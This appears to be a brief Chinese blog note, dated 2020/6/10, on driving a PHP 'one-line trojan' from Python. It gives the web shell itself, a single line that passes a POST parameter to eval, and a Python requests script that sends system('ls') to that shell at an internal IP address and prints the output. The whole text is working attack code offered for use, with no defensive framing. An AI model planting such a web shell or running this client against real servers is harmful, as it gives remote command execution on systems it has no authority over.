# python---连接一句话木马

一句话木马如下：  
```php
<?php @eval($_POST['moxiaoxi']);?>
```

python 脚本如下：  
```python
# coding:utf8

import requests


enemy_addr = 'http://10.160.40.96:8801/webshell.php'

data = {
    'moxiaoxi': "system('ls');"
}

res = requests.post(enemy_addr, data=data)
print(res.content)
```


2020/6/10  
